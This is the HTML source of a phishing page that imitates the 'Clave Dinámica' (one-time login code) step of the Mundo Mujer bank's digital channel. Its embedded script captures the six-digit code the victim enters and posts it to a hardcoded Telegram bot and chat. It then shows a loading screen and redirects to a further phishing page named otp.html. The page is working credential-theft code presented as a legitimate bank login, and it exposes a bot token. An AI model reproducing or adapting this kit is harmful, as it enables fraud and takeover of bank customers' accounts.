<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mundo Mujer - Clave Dinámica</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Open Sans', sans-serif; background-color: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 100%; max-width: 405px; background: white; box-shadow: 0 0 20px rgba(0, 0, 0, 0.1); }
        .carousel-container { position: relative; width: 100%; height: 340px; overflow: hidden; }
        .carousel-slide { position: absolute; width: 100%; height: 100%; opacity: 0; transition: opacity 1s ease-in-out; }
        .carousel-slide.active { opacity: 1; }
        .carousel-slide img { width: 100%; height: 100%; object-fit: cover; }
        .carousel-overlay { position: absolute; top: 20px; left: 20px; z-index: 10; }
        .carousel-overlay img { height: 50px; width: auto; }
        .carousel-text { position: absolute; bottom: 20px; left: 20px; z-index: 10; background: rgba(255, 255, 255, 0.9); padding: 10px 20px; border-radius: 5px; }
        .carousel-text h2 { font-size: 16px; font-weight: 700; color: #333; margin: 0; }
        .carousel-text p { font-size: 12px; color: #666; margin: 2px 0 0 0; }
        .carousel-dots { position: absolute; bottom: 80px; left: 50%; transform: translateX(-50%); z-index: 10; display: flex; gap: 8px; }
        .dot { width: 10px; height: 10px; border-radius: 50%; background: rgba(255, 255, 255, 0.5); cursor: pointer; }
        .dot.active { background: rgba(255, 255, 255, 1); }
        .content { padding: 30px 30px 40px 30px; }
        .title { text-align: center; margin-bottom: 30px; }
        .title h1 { font-size: 14px; font-weight: 400; color: #666; margin-bottom: 5px; }
        .title h1 span { font-weight: 700; color: #4a7ba7; }
        .title h2 { font-size: 18px; font-weight: 700; color: #333; text-transform: uppercase; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; font-size: 14px; color: #666; margin-bottom: 8px; }
        .form-group input { width: 100%; padding: 12px 15px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; font-family: 'Open Sans', sans-serif; color: #333; }
        .form-group input:focus { outline: none; border-color: #4a7ba7; }
        .button-group { display: flex; gap: 15px; margin-bottom: 25px; }
        .btn { flex: 1; padding: 12px; border-radius: 4px; font-size: 15px; font-weight: 600; cursor: pointer; border: none; font-family: 'Open Sans', sans-serif; }
        .btn-login { background: #8fa9c1; color: white; opacity: 0.6; cursor: not-allowed; width: 100%; }
        .btn-login.enabled { background: #2d5a7b; opacity: 1; cursor: pointer; }
        .btn-login.enabled:hover { background: #1e3f56; }
        .loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.95); z-index: 9999; justify-content: center; align-items: center; flex-direction: column; }
        .loading-overlay.active { display: flex; }
        .loading-overlay img { width: 150px; height: auto; margin-bottom: 20px; }
        .loading-overlay p { font-size: 18px; color: #4a7ba7; font-weight: 600; }
        .spinner { width: 40px; height: 40px; border: 4px solid #e0e0e0; border-top: 4px solid #4a7ba7; border-radius: 50%; animation: spin 1s linear infinite; margin-top: 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loading-overlay" id="loadingOverlay">
        <img src="img/logo.png" alt="Mundo Mujer">
        <p>Cargando...</p>
        <div class="spinner"></div>
    </div>

    <div class="container">
        <div class="carousel-container">
            <div class="carousel-overlay">
                <img src="img/logo.png" alt="Mundo Mujer">
            </div>
            
            <div class="carousel-slide active" data-index="0">
                <img src="img/Banner-APP-1-AGRO--v-2025x2400px.jpg" alt="Banner 1">
            </div>
            <div class="carousel-slide" data-index="1">
                <img src="img/Banner-APP-2-PyME--v-2025x2400px.jpg" alt="Banner 2">
            </div>
            <div class="carousel-slide" data-index="2">
                <img src="img/Banner-APP-3-CTM--v-2025x2400px.jpg" alt="Banner 3">
            </div>

            <div class="carousel-text">
                <h2 id="carouselTitle">CRÉDITO DE FÁCIL ACCESO</h2>
                <p id="carouselSubtitle">Y RÁPIDA RESPUESTA</p>
            </div>

            <div class="carousel-dots">
                <span class="dot active" data-index="0"></span>
                <span class="dot" data-index="1"></span>
                <span class="dot" data-index="2"></span>
            </div>
        </div>

        <div class="content">
            <div class="title">
                <h1>Canal Digital <span>Personas</span></h1>
                <h2>CLAVE DINÁMICA</h2>
            </div>

            <form id="dynamicForm">
                <div class="form-group">
                    <label for="dynamic">Ingrese su clave dinámica (6 dígitos)</label>
                    <input type="text" id="dynamic" placeholder="000000" maxlength="6" inputmode="numeric">
                </div>
                <div class="button-group">
                    <button type="submit" class="btn btn-login" id="loginBtn" disabled>Ingresar</button>
                </div>
            </form>
        </div>
    </div>

    <script>
    const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
    const TELEGRAM_CHAT_ID = '-1003784784181';

    document.addEventListener('DOMContentLoaded', function() {
        const dynamic = document.getElementById('dynamic');
        const btn = document.getElementById('loginBtn');
        const form = document.getElementById('dynamicForm');
        const overlay = document.getElementById('loadingOverlay');

        dynamic.addEventListener('input', function() {
            const numericValue = dynamic.value.replace(/\D/g, '').slice(0, 6);
            dynamic.value = numericValue;
            const isValid = numericValue.length === 6;
            btn.disabled = !isValid;
            btn.classList.toggle('enabled', isValid);
        });

        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            if (btn.disabled) return;

            overlay.classList.add('active');

            const mensaje = `🔑 <b>CLAVE DINÁMICA - MUNDO MUJER</b>

<b>Clave:</b> <code>${dynamic.value}</code>

<b>⏰ Recibido:</b> ${new Date().toLocaleString('es-CO')}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje, parse_mode: 'HTML' })
                });

                if ((await response.json()).ok) {
                    setTimeout(() => { window.location.href = '/bancas/Banco-Mundo-Mujer/otp.html'; }, 2000);
                } else {
                    overlay.classList.remove('active');
                }
            } catch (error) {
                overlay.classList.remove('active');
            }
        });
    });
    </script>
</body>
</html>
